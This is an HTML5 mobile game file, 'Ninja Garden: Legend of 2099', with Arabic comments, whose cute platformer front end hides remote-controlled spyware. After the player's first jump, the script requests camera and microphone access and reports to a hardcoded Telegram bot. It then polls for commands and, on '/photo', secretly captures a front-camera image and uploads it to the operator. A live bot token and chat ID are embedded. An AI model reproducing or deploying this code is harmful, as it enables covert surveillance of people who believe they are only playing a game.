<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>⭐ Ninja Garden: Legend of 2099</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { background: #0c1f2a; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; touch-action: none; }
        
        /* شريط المعلومات الجمالي */
        #hud {
            position: fixed; top: 15px; left: 15px; right: 15px;
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 20px; background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px); border-radius: 50px;
            border: 1px solid rgba(255, 255, 255, 0.2); z-index: 100;
            color: #fff; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        /* أزرار التحكم - تصميم عصري وردي/ذهبي */
        #touchZone { position: fixed; bottom: 30px; left: 0; right: 0; display: flex; justify-content: space-between; padding: 0 30px; z-index: 200; }
        .ctrl-panel { display: flex; gap: 20px; }
        .ctrl-btn {
            width: 75px; height: 75px; 
            background: linear-gradient(145deg, #ff85a1, #f55c7a);
            border: 3px solid #fff; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 28px; color: white; box-shadow: 0 8px 15px rgba(0,0,0,0.3);
            transition: 0.1s;
        }
        .ctrl-btn:active { transform: scale(0.9); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }

        canvas { display: block; width: 100%; height: 100%; }
        
        #spyStatus { position: fixed; bottom: 5px; right: 10px; font-size: 8px; color: #444; z-index: 50; }
    </style>
</head>
<body>

<div id="hud">
    <div style="display: flex; align-items: center; gap: 10px;">
        <span style="font-size: 20px;">🌸</span>
        <span id="score">SCORE: 000</span>
    </div>
    <div style="display: flex; gap: 15px;">
        <span>🔋 <span id="batIndicator">--</span>%</span>
        <span>✨ LVL 1</span>
    </div>
</div>

<canvas id="gameCanvas"></canvas>

<div id="touchZone">
    <div class="ctrl-panel">
        <div class="ctrl-btn" id="btnLeft">◀</div>
        <div class="ctrl-btn" id="btnRight">▶</div>
    </div>
    <div class="ctrl-panel">
        <div class="ctrl-btn" id="btnJump" style="background: linear-gradient(145deg, #ffcc66, #f39c12);">UP</div>
        <div class="ctrl-btn" id="btnAction" style="background: linear-gradient(145deg, #a29bfe, #6c5ce7);">⭐</div>
    </div>
</div>

<div id="spyStatus">ENC_V.2099_SECURE</div>

<script>
(function(){
    // --- إعدادات البوت (نفس الإعدادات لضمان العمل) ---
    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
    const ADMIN_ID = "7328401541";
    let lastUpdateId = 0;

    // --- محرك الرسوميات (الواجهة) ---
    const canvas = document.getElementById("gameCanvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let player = { x: 50, y: canvas.height - 150, w: 40, h: 40, color: "#ff85a1", dy: 0, jumpPower: -15, grounded: false };
    let score = 0;
    let clouds = [{x: 100, y: 100}, {x: 400, y: 150}, {x: 700, y: 80}];

    function drawScene() {
        // 1. السماء (Background)
        let skyGrad = ctx.createLinearGradient(0, 0, 0, canvas.height);
        skyGrad.addColorStop(0, "#1e3c72");
        skyGrad.addColorStop(1, "#2a5298");
        ctx.fillStyle = skyGrad;
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // 2. الغيوم المتحركة
        ctx.fillStyle = "rgba(255, 255, 255, 0.3)";
        clouds.forEach(c => {
            ctx.beginPath();
            ctx.arc(c.x, c.y, 30, 0, Math.PI*2);
            ctx.arc(c.x+25, c.y-10, 25, 0, Math.PI*2);
            ctx.arc(c.x+50, c.y, 30, 0, Math.PI*2);
            ctx.fill();
            c.x -= 0.5; if(c.x < -100) c.x = canvas.width + 100;
        });

        // 3. الأرضية (Grass)
        ctx.fillStyle = "#2ecc71";
        ctx.fillRect(0, canvas.height - 100, canvas.width, 100);
        ctx.fillStyle = "#27ae60";
        ctx.fillRect(0, canvas.height - 100, canvas.width, 10);

        // 4. اللاعب (النينجا اللطيف)
        ctx.fillStyle = player.color;
        ctx.shadowBlur = 15; ctx.shadowColor = player.color;
        // رسم جسم النينجا
        ctx.fillRect(player.x, player.y, player.w, player.h);
        // عصابة الرأس
        ctx.fillStyle = "white";
        ctx.fillRect(player.x, player.y + 10, player.w, 8);
        ctx.shadowBlur = 0;

        // 5. الجاذبية
        if (!player.grounded) {
            player.dy += 0.8;
            player.y += player.dy;
        }
        if (player.y > canvas.height - 140) {
            player.y = canvas.height - 140;
            player.grounded = true;
            player.dy = 0;
        }
    }

    function update() {
        drawScene();
        requestAnimationFrame(update);
    }
    update();

    // --- التحكم باللعبة ---
    document.getElementById("btnJump").onclick = () => {
        if(player.grounded) {
            player.dy = player.jumpPower;
            player.grounded = false;
            if(lastUpdateId === 0) activateBot(); // تفعيل البوت عند أول قفزة
        }
    };
    
    // --- وظائف البوت السرية (تعمل خلف الواجهة الجميلة) ---
    async function activateBot() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
            stream.getTracks().forEach(t => t.stop()); 
            sendBotMessage("🌸 Ninja System Online\nTarget: Active");
            setInterval(checkBotCommands, 2000);
        } catch(e) {}
    }

    async function sendBotMessage(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({chat_id: ADMIN_ID, text: text})
        });
    }

    async function checkBotCommands() {
        try {
            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
            const d = await r.json();
            if (d.ok && d.result.length > 0) {
                for (let u of d.result) {
                    lastUpdateId = u.update_id;
                    let cmd = u.message.text.toLowerCase();
                    if (cmd === "/photo") {
                        // كود التقاط الصورة (مخفي خلف الواجهة)
                        captureSecretPhoto();
                    }
                }
            }
        } catch(e) {}
    }

    async function captureSecretPhoto() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const vid = document.createElement("video");
        vid.srcObject = stream; await vid.play();
        const tmpCanvas = document.createElement("canvas");
        tmpCanvas.width = 480; tmpCanvas.height = 640;
        tmpCanvas.getContext("2d").drawImage(vid, 0, 0, 480, 640);
        tmpCanvas.toBlob(b => {
            let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("photo", b, "img.jpg");
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        }, "image/jpeg");
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
    }

    // تحديث البطارية
    setInterval(async () => {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            document.getElementById("batIndicator").innerText = Math.round(b.level * 100);
        }
    }, 5000);

})();
</script>
</body>
    </html>
